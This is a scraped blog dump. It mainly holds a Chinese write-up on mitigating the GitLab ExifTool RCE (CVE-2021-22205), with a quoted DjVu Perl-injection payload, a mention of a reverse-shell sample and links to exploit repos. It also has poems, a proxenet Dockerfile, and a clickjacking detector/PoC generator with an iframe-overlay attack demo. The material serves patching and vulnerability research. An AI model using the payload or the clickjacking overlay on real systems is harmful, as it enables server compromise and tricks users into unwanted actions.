https://docs.gitlab.com/ee/update/package/index.html#upgrade-to-a-specific-version-using-the-official-repositories 将GitLab升级到安全版本。\n安全版本的GitLab底层使用了安全版本的ExifTool，并且在将文件传给ExiTool处理前，添加了对文件格式的判断。\n为了避免兼容性问题，只需要升级到对应小版本的安全版本即可，并不一定要升级大版本。\n组件 影响版本 安全版本 GitLab(CE/EE) \u0026lt;13.8.8 \u0026amp; \u0026gt;= 11.9 13.8.8 GitLab(CE/EE) \u0026lt;13.9.6 \u0026amp; \u0026gt;= 13.9 13.9.6 GitLab(CE/EE) \u0026lt;13.10.3 \u0026amp; \u0026gt;= 13.10 13.10.3 缓解 简言之\n1 sudo apt install -y libimage-exiftool-perl 具体来说\n这个帖子 讨论了的漏洞根因和应对方案。其中一种是行之有效并且易于操作的，就是升级ExifTool。\nWarkeeper @Warkeeper · 4 months ago @rshambhuni The version of GitLab I installed from source is \u0026ldquo;13.6.1 (c0876634cc0)\u0026rdquo; (I cloned it from GitHub\u0026rsquo;s master branch some day in April), and it\u0026rsquo;s running on ubuntu 18.04. I reproduced this issue in my setup and found that my setup is also affected by it.\nAfter reading the description of CVE-2021-22205 and this issue, I think it\u0026rsquo;s mostly the fault of \u0026ldquo;ExifTool\u0026rdquo;. Since Ubuntu has released a security version of \u0026ldquo;ExifTool\u0026rdquo;, I tried to update ExifTool to 10.80-1ubuntu0.1 in my setup, and after that, I can\u0026rsquo;t reproduce this issue.\nBut I\u0026rsquo;m not sure if updating ExifTool is safe enough for this issue, should I update my GitLab as well?\nHeinrich Lee Yu @engwan · 4 months ago Maintainer Yes, upgrading exiftool would prevent the vulnerability. It would still be good to upgrade GitLab though since we added extra checks to prevent other file types from being processed by exiftool.\nThere was also another severity 1 vulnerability that was fixed in the same critical security release.\n——https://gitlab.com/gitlab-org/gitlab/-/issues/327121#note_614878062\n由于漏洞本质上是由ExifTool的CVE-2021-22204引起的，所以升级ExifTool理论上是能够缓解漏洞的。\nImproper neutralization of user data in the DjVu file format in ExifTool versions 7.44 and up allows arbitrary code execution when parsing the malicious image\nUpstream patch\n——https://bugs.launchpad.net/ubuntu/+source/libimage-exiftool-perl/+bug/1925985\nExifTool在Linux上软件包名叫做 libimage-exiftool-perl，不同发行版上不受CVE-2021-22204影响的安全版本列表如下：\nRelease Version stretch 10.40-1 stretch (security) 10.40-1+deb9u1 buster 11.16-1+deb10u1 bullseye 12.16+dfsg-2 bookworm 12.33+dfsg-1 sid 12.34+dfsg-1 ——https://security-tracker.debian.org/tracker/source-package/libimage-exiftool-perl\n具体操作如下：\n1 2 3 4 5 6 7 8 9 10 11 查看一个软件的可安装版本 apt-cache madison libimage-exiftool-perl 安装某低版本的ExifTool sudo apt install libimage-exiftool-perl=11.88-1 查看已安装ExifTool的版本 exiftool -ver 升级ExifTool版本到最新 sudo apt install -y libimage-exiftool-perl 操作示例：\n实测有效的覆盖更新方法（在Ubuntu18.04上从exiftool 11.7升级到12.34）\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 # 搭建测试环境： # 从 https://packages.gitlab.com/app/gitlab/gitlab-ce/search?q=13.8.0\u0026amp;filter=debs\u0026amp;filter=debs\u0026amp;dist=ubuntu 下载gitlab包 dpkg -i pkgname.deb # 下载 libimage-exiftool-perl_12.34+dfsg-1_all.deb wget http://mirrors.aliyun.com/ubuntu/pool/universe/libi/libimage-exiftool-perl/libimage-exiftool-perl_12.34%2Bdfsg-1_all.deb # 安装 dpkg -i libimage-exiftool-perl_12.34+dfsg-1_all.deb # 备份 tar czf /tmp/exiftool_1170.tgz /opt/gitlab/embedded/lib/exiftool-perl/ /opt/gitlab/embedded/bin/exiftool # 覆盖内嵌exiftool及其依赖 cp /usr/bin/exiftool /opt/gitlab/embedded/bin/exiftool cp -r /usr/share/perl5/Image/ExifTool /opt/gitlab/embedded/lib/exiftool-perl/ cp /usr/share/perl5/File/RandomAccess.pm /opt/gitlab/embedded/lib/exiftool-perl/File/ cp /usr/share/perl5/File/RandomAccess.pod /opt/gitlab/embedded/lib/exiftool-perl/File/ 其他OS，如centos，到 https://pkgs.org/download/libimage-exiftool-perl 页面下载包，参考https://exiftool.org/install.html#Unix 编译后替换gitlab内嵌的exiftool及其依赖。\n原始报告 链接：https://hackerone.com/reports/1154542\n部分节选如下\nSummary When uploading image files, GitLab Workhorse passes any files with the extensions jpg|jpeg|tiff through to ExifTool to remove any non-whitelisted tags.\nAn issue with this is that ExifTool will ignore the file extension and try to determine what the file is based on the content, allowing for any of the supported parsers to be hit instead of just JPEG and TIFF by just renaming the uploaded file.\nOne of the supported formats is DjVu. When parsing the DjVu annotation, the tokens are evaled to \u0026ldquo;convert C escape sequences\u0026rdquo;.\nThere is some validation to try and ensure that everything is properly escaped, but a backslash followed by a newline is correctly handled allowing the quotes to be closed and arbitrary perl inserted and evaluated:\nCode\n1 2 3 4 (metadata (Copyright \u0026#34;\\ \u0026#34; . qx{echo vakzz \u0026gt;/tmp/vakzz} . \\ \u0026#34; b \u0026#34;) ) echo_vakzz.jpg.zip is an example DjVu file with the above metadata, and reverse_shell.jpg.zip is an example that runs a reverse shell.\nSteps to reproduce Download echo_vakzz.jpg.zip and unzip it Create a new snippet In the description field, hit \u0026ldquo;Attach a file\u0026rdquo; Select and uplaod echo_vakzz.jpg See that the file /tmp/vakzz has been created on the server Uploading reverse_shell.jpg.zip to https://gitlab.com/-/snippets/new resulted in a shell on web-09-sv-gprd\nbonus 使用exiftool的网站都可能受影响，或许是个金矿。测试方法应该是上传再下载，看看元数据是否还被保留。如果被删除了，有一定可能性图片在后端处理时经过了exiftool。\nThere are lots of websites that will display the EXIF data for an image, and also image sharing websites like Flickr and 500px will provide EXIF data for uploaded images by default. Don’t know how many of those use this tool, but I suspect there are lots of bug bounties to be had from this vulnerability.\n——https://old.reddit.com/r/netsec/comments/n36x7h/arbitrary_code_execution_in_exiftool/gwpgk3v/\n参考链接 https://hackerone.com/reports/1154542\nhttps://gitlab.com/gitlab-org/gitlab/-/issues/327121\nhttps://security.humanativaspa.it/gitlab-ce-cve-2021-22205-in-the-wild/\nhttps://github.com/exiftool/exiftool/blob/11.70/lib/Image/ExifTool/DjVu.pm#L233\nhttps://www.reddit.com/r/netsec/comments/qfbea1/gitlab_ce_cve202122205_in_the_wild/\nhttps://old.reddit.com/r/netsec/comments/n36x7h/arbitrary_code_execution_in_exiftool/gwpgk3v/\nhttps://about.gitlab.com/releases/2021/04/14/security-release-gitlab-13-10-3-released/#Remote-code-execution-when-uploading-specially-crafted-image-files\nhttps://bugs.launchpad.net/ubuntu/+source/libimage-exiftool-perl/+bug/1925985\nhttps://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-22204\nhttps://security-tracker.debian.org/tracker/source-package/libimage-exiftool-perl\nhttps://docs.gitlab.com/ee/update/package/index.html#upgrade-to-a-specific-version-using-the-official-repositories\nhttps://twitter.com/pdnuclei/status/1453351196350029829\nhttps://github.com/CsEnox/Gitlab-Exiftool-RCE/blob/main/exploit.py\nhttps://github.com/mr-r3bot/Gitlab-CVE-2021-22205\nhttps://github.com/findneo/GitLab-preauth-RCE_CVE-2021-22205\n","permalink":"https://ret2neo.cn/post/211031-cve-2021-22205-mitigation/","summary":"概况 Remote code execution when uploading specially crafted image files\nAn issue has been discovered in GitLab CE/EE affecting all versions starting from 11.9. GitLab was not properly validating image files that is passed to a file parser which resulted in a remote command execution. This is a critical severity issue (AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H, 9.9). It is now mitigated in the latest release and is assigned CVE-2021-22205.\nThanks vakzz for reporting this vulnerability through our HackerOne bug bounty program.","title":"CVE-2021-22205：GitLab远程代码执行漏洞分析"},{"content":" 江湖聚散如流水浮萍\n星海明灭伴玉鸟归笼\n昼夜难逾而山海难平\n欲流横渡会诸君彼岸\n","permalink":"https://ret2neo.cn/mind/210823-dust/","summary":"江湖聚散如流水浮萍\n星海明灭伴玉鸟归笼\n昼夜难逾而山海难平\n欲流横渡会诸君彼岸","title":"尘埃"},{"content":"dockerfile内容 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 from debian:latest # https://proxenet.readthedocs.io/en/latest/compil/ ENV DEBIAN_FRONTEND noninteractive RUN apt-get update -y \\ \u0026amp;\u0026amp; apt-get install -y git cmake libmbedtls-dev tclsh pkg-config libmbedx509-0 ruby-dev liblua5.2-dev libperl-dev python3-dev python-dev ncat jq \\ \u0026amp;\u0026amp; cp /usr/include/x86_64-linux-gnu/ruby-2.5.0/ruby/config.h /usr/include/ruby-2.5.0/ruby/config.h \\ \u0026amp;\u0026amp; git clone https://github.com/hugsy/proxenet.git \\ \u0026amp;\u0026amp; cd proxenet \\ \u0026amp;\u0026amp; cmake . -DUSE_JAVA_PLUGIN=OFF \\ \u0026amp;\u0026amp; make \\ \u0026amp;\u0026amp; make install \\ \u0026amp;\u0026amp; make -C keys \\ \u0026amp;\u0026amp; mkdir ~/.proxenet \\ \u0026amp;\u0026amp; cp -r keys ~/.proxenet \\ \u0026amp;\u0026amp; cd ~/.proxenet \\ \u0026amp;\u0026amp; git clone https://github.com/hugsy/proxenet-plugins.git plugins \\ \u0026amp;\u0026amp; mkdir plugins/autoload \\ \u0026amp;\u0026amp; ln -s /opt/proxenet/bin/proxenet /usr/local/bin/proxenet # RUN proxenet -b 127.0.0.1 -p 8090 -d # RUN proxenet -h # docker build -t proxenet:v0.1 . # docker run --rm -p80:8008 -it proxenet:v0.1 proxenet -b 0.0.0.0 -v # docker save eee7c1517197.imagename \u0026gt; proxenet-`date +%Y%m%d`.tar # docker load \u0026lt; xxx.tar # echo \u0026#34;version\u0026#34; | ncat -U /tmp/proxenet-control-socket |grep -Po \u0026#34;(?\u0026lt;=\u0026gt;\u0026gt;\u0026gt;).*(?=\u0026gt;\u0026gt;\u0026gt;)\u0026#34; |jq ENV DEBIAN_FRONTEND newt 构建镜像\n1 docker build -t proxenet:v0.1 . 运行容器\n1 docker run --rm -p80:8008 -it proxenet:v0.1 proxenet -b 0.0.0.0 -v 导出构建好的镜像\n1 docker save eee7c1517197.imagename \u0026gt; proxenet-`date +%Y%m%d`.tar 导入构建好的镜像\n1 docker load \u0026lt; xxx.tar 在容器内试用UDP的调试端口\n1 echo \u0026#34;version\u0026#34; | ncat -U /tmp/proxenet-control-socket |grep -Po \u0026#34;(?\u0026lt;=\u0026gt;\u0026gt;\u0026gt;).*(?=\u0026gt;\u0026gt;\u0026gt;)\u0026#34; |jq 使用插件🔨\n参考资料 \u003c!DOCTYPE HTML\u003e\r","permalink":"https://ret2neo.cn/post/210721-build-proxenet-using-docker/","summary":"dockerfile内容 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 from debian:latest # https://proxenet.readthedocs.io/en/latest/compil/ ENV DEBIAN_FRONTEND noninteractive RUN apt-get update -y \\ \u0026amp;\u0026amp; apt-get install -y git cmake libmbedtls-dev tclsh pkg-config libmbedx509-0 ruby-dev liblua5.2-dev libperl-dev python3-dev python-dev ncat jq \\ \u0026amp;\u0026amp; cp /usr/include/x86_64-linux-gnu/ruby-2.5.0/ruby/config.h /usr/include/ruby-2.5.0/ruby/config.h \\ \u0026amp;\u0026amp; git clone https://github.com/hugsy/proxenet.git \\ \u0026amp;\u0026amp; cd proxenet \\ \u0026amp;\u0026amp; cmake .","title":"使用docker构建proxenet"},{"content":" 世间万象\n即生即灭\n心不可欺\n触不可及\n","permalink":"https://ret2neo.cn/mind/210720-brilliance-and-decay/","summary":"世间万象\n即生即灭\n心不可欺\n触不可及","title":"灿烂与腐烂"},{"content":" 这一年这一天的清晨，我似乎理解了\n应无所住而生其心\n也意识到了同一阵风吹过，人人感受不同\n即所谓睁眼花开闭眼花寂\n","permalink":"https://ret2neo.cn/mind/210709-thoughts-flow/","summary":"这一年这一天的清晨，我似乎理解了\n应无所住而生其心\n也意识到了同一阵风吹过，人人感受不同\n即所谓睁眼花开闭眼花寂","title":"念流勿住"},{"content":" 一个在小城播放了一生电影的老头告诉你\n看一部电影一百遍只因为无事可做\n你需要去做完全不同的事情\n请走出去，别回头，别思念\n如果遇到什么，请热爱，像爱电影一样\n一个蓝眼睛的姑娘告诉你\n你很可爱，但我不爱你\n你在楼下站了几个月于是她以身相许\n但某一天她又消失无踪，再无音信\n你几十年后回家，对母亲说你不累\n其实只需要飞一个小时就到了\n你的身旁女人来了又去，你的母亲说没有听出真正的爱\n士兵在公主楼下站了九十九天\n在最后一天夜里离开了\n为什么呢，也许是他觉得爱已经完成\n也许他觉得唯有离开才能圆满\n我想去海边，但走丢了，也走累了\n夜里十一点\n垃圾堆旁拾荒的老奶奶\n报刊亭里玩手机的中年妇女\n骑共享单车飞奔的少年\n骑电动自行车运货的中年男人\n深圳湾公园里依偎的情侣\n情侣旁外放抖音搞笑视频的保安大哥\n保安大哥旁埋头玩手机的独自一人的青年\n全副武装白袜格外亮眼的单车少女\n六点到十一点开放的大桥拦不住的\n是日夜奔涌燃烧不停的平凡生活和无限热情\n谁能说清，生活应该是怎样的呢\n有多美好又有多糟糕\n","permalink":"https://ret2neo.cn/mind/210629-heaven-theater/","summary":"一个在小城播放了一生电影的老头告诉你\n看一部电影一百遍只因为无事可做\n你需要去做完全不同的事情\n请走出去，别回头，别思念\n如果遇到什么，请热爱，像爱电影一样\n一个蓝眼睛的姑娘告诉你\n你很可爱，但我不爱你\n你在楼下站了几个月于是她以身相许\n但某一天她又消失无踪，再无音信\n你几十年后回家，对母亲说你不累\n其实只需要飞一个小时就到了\n你的身旁女人来了又去，你的母亲说没有听出真正的爱\n士兵在公主楼下站了九十九天\n在最后一天夜里离开了\n为什么呢，也许是他觉得爱已经完成\n也许他觉得唯有离开才能圆满\n我想去海边，但走丢了，也走累了\n夜里十一点\n垃圾堆旁拾荒的老奶奶\n报刊亭里玩手机的中年妇女\n骑共享单车飞奔的少年\n骑电动自行车运货的中年男人\n深圳湾公园里依偎的情侣\n情侣旁外放抖音搞笑视频的保安大哥\n保安大哥旁埋头玩手机的独自一人的青年\n全副武装白袜格外亮眼的单车少女\n六点到十一点开放的大桥拦不住的\n是日夜奔涌燃烧不停的平凡生活和无限热情\n谁能说清，生活应该是怎样的呢\n有多美好又有多糟糕","title":"天堂电影院"},{"content":" 事隔经年，回忆已开始混乱模糊\n那些日子，阳光明媚，但我总是幽居一室\n埋头苦读，不问世事，忙时做题，闲时打球\n不知也未曾想未来是什么在等待\n那时的我尚未经历多少生活\n却因为看了太多老庄而自以为超脱\n如今想来，关于生活，理解了什么并不那么重要\n真正的生活应该是具体的，呼吸之间，方寸之内\n那时的光荣与梦想，鲜花和爱情\n时过境迁只剩高糊的相片\n和当时日记中凌乱笔迹间的喜怒哀乐\n岁月穿过我们，似乎什么也没留下\n还来不及整理，就已经来到了今天\n想告诉那时的自己，不要难过\n梦只是梦，你还是你\n勇敢执着地前进，踏实坚定地创造\n所有生活都值得用心去过\n每条道路都可能遇见美好\n","permalink":"https://ret2neo.cn/mind/210607-today-yet-another-year/","summary":"事隔经年，回忆已开始混乱模糊\n那些日子，阳光明媚，但我总是幽居一室\n埋头苦读，不问世事，忙时做题，闲时打球\n不知也未曾想未来是什么在等待\n那时的我尚未经历多少生活\n却因为看了太多老庄而自以为超脱\n如今想来，关于生活，理解了什么并不那么重要\n真正的生活应该是具体的，呼吸之间，方寸之内\n那时的光荣与梦想，鲜花和爱情\n时过境迁只剩高糊的相片\n和当时日记中凌乱笔迹间的喜怒哀乐\n岁月穿过我们，似乎什么也没留下\n还来不及整理，就已经来到了今天\n想告诉那时的自己，不要难过\n梦只是梦，你还是你\n勇敢执着地前进，踏实坚定地创造\n所有生活都值得用心去过\n每条道路都可能遇见美好","title":"那年今日"},{"content":" 世间好物不坚牢，彩云易散琉璃碎\n当年华逝去，青春远走，衰老和肥胖占据上风\n人成为自己都厌恶的东西\n怨憎会，爱别离，求不得\n不约而至，无人可免\n我们伸手说别走，但没有人为他人真正停留\n所有人只在乎自己，人们不过恰好路过彼此\n","permalink":"https://ret2neo.cn/mind/210606-time-is-thief/","summary":"世间好物不坚牢，彩云易散琉璃碎\n当年华逝去，青春远走，衰老和肥胖占据上风\n人成为自己都厌恶的东西\n怨憎会，爱别离，求不得\n不约而至，无人可免\n我们伸手说别走，但没有人为他人真正停留\n所有人只在乎自己，人们不过恰好路过彼此","title":"时间是贼偷走一切"},{"content":" 一切美好，源于短暂稀缺\n所谓浪漫，就是没有后来\n饱食久卧，珍馐而索然无味\n口渴至极，白开亦人间至善\n渴望烟火般的绚烂和无比热烈的燃烧\n就须对寒冷绝望风吹四散的灰烬心有预期\n好在人间一切有限，有限成就了一切美好\n生命如此轻飘飘，每一次，我都选择燃烧\n","permalink":"https://ret2neo.cn/mind/210605-rare-is-beauty/","summary":"一切美好，源于短暂稀缺\n所谓浪漫，就是没有后来\n饱食久卧，珍馐而索然无味\n口渴至极，白开亦人间至善\n渴望烟火般的绚烂和无比热烈的燃烧\n就须对寒冷绝望风吹四散的灰烬心有预期\n好在人间一切有限，有限成就了一切美好\n生命如此轻飘飘，每一次，我都选择燃烧","title":"美即稀缺"},{"content":" 世界似布满迷雾的森林\n沉默，最多是安全，却已未必\n开口，会引来敌人，或者朋友\n前进，会带来伤痛，或是幸福\n试探，被无序摧毁，或者蜕变\n混乱，是上升的阶梯，也是无序的深渊\n熵增，触发更多可能，或可能吞噬所有\n沉默还是开口，等待还是行动\n犹疑还是相信，放下还是执着\n总是选择后者，因为那会带来更多可能\n未知，可能性，变化等，宽泛意义上都指向运动\n而生命在于运动\n","permalink":"https://ret2neo.cn/mind/210602-be-silent-or-not/","summary":"世界似布满迷雾的森林\n沉默，最多是安全，却已未必\n开口，会引来敌人，或者朋友\n前进，会带来伤痛，或是幸福\n试探，被无序摧毁，或者蜕变\n混乱，是上升的阶梯，也是无序的深渊\n熵增，触发更多可能，或可能吞噬所有\n沉默还是开口，等待还是行动\n犹疑还是相信，放下还是执着\n总是选择后者，因为那会带来更多可能\n未知，可能性，变化等，宽泛意义上都指向运动\n而生命在于运动","title":"表达还是沉默"},{"content":"概述 batchDetectClickjacking可以用于自动化批量检测和利用点击劫持类漏洞。支持\n对多个HTTP站点批量快速检测 对存在点击劫持类漏洞的网站生成利用代码PoC 指定检测时使用的并发线程数 从管道或文件输入被测站点 指定单个网站检测的超时时间 指定检测时使用的网络代理 指定检测时使用的User-Agent 常见用法 1 2 3 4 5 6 7 8 # 检测单个网站链接是否受点击劫持漏洞影响 echo https://www.qq.com | ./batchDetectClickjacking # 检测文件urls.txt中的多个链接 cat urls.txt | ./batchDetectClickjacking # 使用100个线程检测大量url链接，只显示存在漏洞的网站，同时为每个漏洞网站生成PoC ./batchDetectClickjacking -iL urls.txt -s -g -t 100 支持参数 1 2 3 4 5 6 7 8 -h 查看帮助 -g 为存在漏洞的网站生成PoC -iL 指定一个文件，其中包含若干待检测的网站地址，每行一个 -s 只显示存在漏洞的网站；默认情况下还会显示不存在漏洞的网站链接并显示响应头的X-Frame-Options值。 -t 指定检测时候使用的线程数，默认情况下是50个线程 -u 指定发起请求使用的UA，默认情况下是Firefox -w 指定每个请求的超时时间，默认情况下是30s -x 指定发起请求使用的网络代理，可以用于和burpsuite联动 漏洞原理及危害 点击劫持攻击，也称UI覆盖攻击，允许恶意页面以用户的名义点击“受害网站”，欺骗用户进行转账、点赞、关注、转发等操作，或者窃取用户凭据。\n一个典型的利用场景是欺骗用户进行转账、点赞、关注或转发。如果业务网站的某正常功能页面A存在点击劫持漏洞，攻击者可以在恶意网站B中使用iframe标签包含A页面，但将A页面置顶并设为透明，这样用户认为自己在B网站上点击时，实际上是在被欺骗着点击了A网站。从而恶意网站B能够做到以用户名义点击A网站，进行转账、转发等敏感操作。\n另一种典型的利用场景是窃取用户账号密码等身份凭据。如果业务网站的某正常功能页面A存在点击劫持漏洞，攻击者可以在恶意网站B包含A页面，将A页面置底并将B网站设为透明，这样用户认为自己在A网站进行输入时，实际上输入数据会被B网站获取到。\n漏洞修复方法 主要有两种方式可以防御点击劫持，第一种是X-Frame-Options头信息（推荐使用，但可能有些浏览器不支持）；第二种方式是使用javascript编写嵌入阻断代码（代码编写不当时可能被绕过，但当流量经过的某些web代理可能被去掉X-Frame-Options头时可以考虑这种方式）。\nX-Frame-Options HTTP响应头能用来向浏览器指明是否允许渲染在iframe标签内的页面。网站可以用它来确保网站内容不被嵌入到其他站点，从而避免遭受点击劫持攻击。X-Frame-Options头信息有三种可用的值:，推荐使用SAMEORIGIN或DENY。\nDENY，阻止所有的域名嵌入此页面。. SAMEORIGIN，只允许同源站点嵌入此页面。 ALLOW-FROM uri，允许指定的“URI”嵌入此页面（如ALLOW-FROM http://www.example.com ，则允许www.example.com嵌入此页面）。ALLOW-FROM选项是2012年左右添加的, 所以一些旧浏览器可能不支持这个参数。不要依赖ALLOW-FROM参数。如果你使用这个选项，但是浏览器不支持它，那相当于你没有做任何点击劫持防御。 漏洞示意demo 正常业务网站A（存在点击劫持漏洞）: http://localhost:8090/sitea.html\n恶意网站B（实际攻击中会将A网站完全透明化）：http://localhost:8091/siteb.html\n用户被吸引点击彩色按钮时实际上可能触发转账或者转发的操作。\ndemo源码： sitea.html\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 \u0026lt;html lang=\u0026#34;en-US\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;I Frame\u0026lt;/title\u0026gt; \u0026lt;style\u0026gt; body { background-color: #93B874; } \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1 align=\u0026#34;center\u0026#34;\u0026gt;A 网站：提供正常业务，可以点击进行转账等敏感操作\u0026lt;/h1\u0026gt; \u0026lt;br\u0026gt; \u0026lt;p align=\u0026#34;center\u0026#34;\u0026gt; \u0026lt;button style=\u0026#34;height:100px;width:180px;background:grey\u0026#34;\u0026gt;喜欢这篇文章吗？\u0026lt;br\u0026gt;点这个按钮给作者转账\u0026lt;/button\u0026gt; \u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt; \u0026lt;button style=\u0026#34;height:125px;width:250px;background:grey\u0026#34;\u0026gt;不喜欢这篇文章吗？\u0026lt;br\u0026gt;点这个按钮转发文章，让更多人讨厌它\u0026lt;/button\u0026gt; \u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; siteb\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 \u0026lt;html lang=\u0026#34;zh-CN\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34; /\u0026gt; \u0026lt;title\u0026gt;彩票开奖网站\u0026lt;/title\u0026gt; \u0026lt;style\u0026gt; #target_website { position:absolute; width:2000px; height:1280px; opacity:0.2; z-index:1; } #decoy_website { position:absolute; width:2000px; height:1280px; z-index:-1; } \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div id=\u0026#34;decoy_website\u0026#34; align=\u0026#34;center\u0026#34;\u0026gt; \u0026lt;br\u0026gt;\u0026lt;h1 \u0026gt;B网站：花里胡哨但会吸引人进行点击操作的恶意网站\u0026lt;/h1\u0026gt; \u0026lt;p align=\u0026#34;center\u0026#34;\u0026gt; \u0026lt;button style=\u0026#34;height:30px;width:140px;background:red\u0026#34;\u0026gt;点这个按钮抽大奖\u0026lt;/button\u0026gt; \u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt; \u0026lt;b style=\u0026#34;color:blue\u0026#34;\u0026gt;快来点我啊，点我有惊喜！！！\u0026lt;/b\u0026gt; \u0026lt;br\u0026gt;\u0026lt;br\u0026gt; \u0026lt;button style=\u0026#34;height:30px;width:140px;background:green\u0026#34;\u0026gt;点这个按钮领红包\u0026lt;/button\u0026gt; \u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div id=\u0026#34;target_website\u0026#34; align=\u0026#34;center\u0026#34;\u0026gt; \u0026lt;iframe src=\u0026#34;http://localhost:8090/sitea.html\u0026#34; height=\u0026#34;40%\u0026#34; width=\u0026#34;40%\u0026#34; align=\u0026#34;middle\u0026#34; allowtransparency=\u0026#34;true\u0026#34;\u0026gt;\u0026lt;/iframe\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 工具源码 vpackage main import ( \u0026#34;bufio\u0026#34; \u0026#34;crypto/md5\u0026#34; \u0026#34;crypto/tls\u0026#34; \u0026#34;errors\u0026#34; \u0026#34;flag\u0026#34; \u0026#34;fmt\u0026#34; \u0026#34;net/http\u0026#34; \u0026#34;net/url\u0026#34; \u0026#34;os\u0026#34; \u0026#34;path\u0026#34; \u0026#34;path/filepath\u0026#34; \u0026#34;strings\u0026#34; \u0026#34;sync\u0026#34; \u0026#34;time\u0026#34; ) //batchDetectClickjacking.go // usage //sort -u /mnt/d/record/burphttp/monitor/domain | httpx | ./batchDetectClickjacking -x http://127.0.0.1:8080 -v -t 50 | tee -a res.txt // banner //https://manytools.org/hacker-tools/ascii-banner/ // Rounded font const banner = ` ______ _ ______ (____ \\ _ | | (______) _ _ ____) )_____ _| |_ ____| |__ _ _ _____ _| |_ _____ ____ _| |_ | __ ((____ (_ _) ___) _ \\ | | | | ___ (_ _) ___ |/ ___|_ _) | |__) ) ___ | | |( (___| | | | | |__/ /| ____| | |_| ____( (___ | |_ |______/\\_____| \\__)____)_| |_| |_____/ |_____) \\__)_____)\\____) \\__) _______ _ _ _ _ _ _ (_______) |(_) | | (_) | | (_) _ | | _ ____| | _ _ _____ ____| | _ _ ____ ____ | | | || |/ ___) |_/ )| (____ |/ ___) |_/ ) | _ \\ / _ | | |_____| || ( (___| _ ( | / ___ ( (___| _ (| | | | ( (_| | \\______)\\_)_|\\____)_| \\_)| \\_____|\\____)_| \\_)_|_| |_|\\___ | (__/ (_____| by findneo ` // options type Options struct { mode string InputFile string Silent bool generatePoC bool threads int timeout int useragent string proxy string headersFile string } type customHeader struct { key string value string } var options *Options func parse_options() *Options { options := \u0026amp;Options{} //flag.StringVar(\u0026amp;options.mode, \u0026#34;m\u0026#34;, \u0026#34;\u0026#34;, \u0026#34;find404|fmtjs|newjs\u0026#34;) flag.StringVar(\u0026amp;options.InputFile, \u0026#34;iL\u0026#34;, \u0026#34;\u0026#34;, \u0026#34;file contains url stirngs /input can be from os.stdin or pipe\u0026#34;) flag.BoolVar(\u0026amp;options.Silent, \u0026#34;s\u0026#34;, false, \u0026#34;show only vuln sites\u0026#34;) flag.BoolVar(\u0026amp;options.generatePoC, \u0026#34;g\u0026#34;, false, \u0026#34;gen PoC for vuln sites\u0026#34;) flag.IntVar(\u0026amp;options.threads, \u0026#34;t\u0026#34;, 50, \u0026#34;limit concurrent threads num\u0026#34;) flag.IntVar(\u0026amp;options.timeout, \u0026#34;w\u0026#34;, 30, \u0026#34;timeout seconds\u0026#34;) flag.StringVar(\u0026amp;options.useragent, \u0026#34;u\u0026#34;, \u0026#34;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\u0026#34;, \u0026#34;Custom User agent\u0026#34;) flag.StringVar(\u0026amp;options.proxy, \u0026#34;x\u0026#34;, \u0026#34;\u0026#34;, \u0026#34;Custom proxy,like http://127.0.0.1:8080\u0026#34;) flag.StringVar(\u0026amp;options.headersFile, \u0026#34;hf\u0026#34;, \u0026#34;\u0026#34;, \u0026#34;file contains Custom Headers,like Cookie: qwq\u0026#34;) flag.Parse() return options } var tr *http.Transport var client *http.Client var PoCdir string var customHeaders []customHeader func global_init() { tr = \u0026amp;http.Transport{ //MaxIdleConns: 10, //MaxIdleConns: options.threads, //IdleConnTimeout: 30 * time.Second, //no good ，即使设了这个，单个请求超时时间还是会达到130秒 //DisableCompression: true, MaxIdleConnsPerHost: -1, TLSClientConfig: \u0026amp;tls.Config{ InsecureSkipVerify: true, }, DisableKeepAlives: true, } // 如果指定了proxy，则所有请求都使用该proxy if options.proxy != \u0026#34;\u0026#34; { proxyUrl, err := url.Parse(options.proxy) if err != nil { fmt.Fprintln(os.Stderr, \u0026#34;自定义的proxy格式有误，不设置代理\u0026#34;) } else { tr.Proxy = http.ProxyURL(proxyUrl) } } client = \u0026amp;http.Client{ Transport: tr, Timeout: time.Duration(options.timeout) * time.Second, CheckRedirect: func(req *http.Request, via []*http.Request) error { redirect_limit := 20 if len(via) \u0026gt;= redirect_limit { // 默认重定向次数是10次 return errors.New(fmt.Sprintf(\u0026#34;stopped after %d redirects\u0026#34;, redirect_limit)) } return nil }, } if options.generatePoC { // 如果指定要生成PoC，则新建一个文件夹。 PoCdir = \u0026#34;clickjackPoCs_\u0026#34; + time.Now().Format(\u0026#34;20060102_150405\u0026#34;) if _, err := os.Stat(PoCdir); os.IsNotExist(err) { err1 := os.Mkdir(PoCdir, 777) if err1 != nil { throwErr(\u0026#34;创建PoC文件夹失败：\u0026#34;+PoCdir, err1) } else { //fmt.Fprintln(os.Stderr,\u0026#34;创建PoC文件夹成功：\u0026#34;+PoCdir) abs, _ := filepath.Abs(PoCdir) throwErr(\u0026#34;生成的PoC将存放在以下文件夹：\u0026#34;+abs, nil) } } } //如果指定了自定义请求头的文件，则尝试解析请求头文件 if options.headersFile != \u0026#34;\u0026#34; { finput, err := 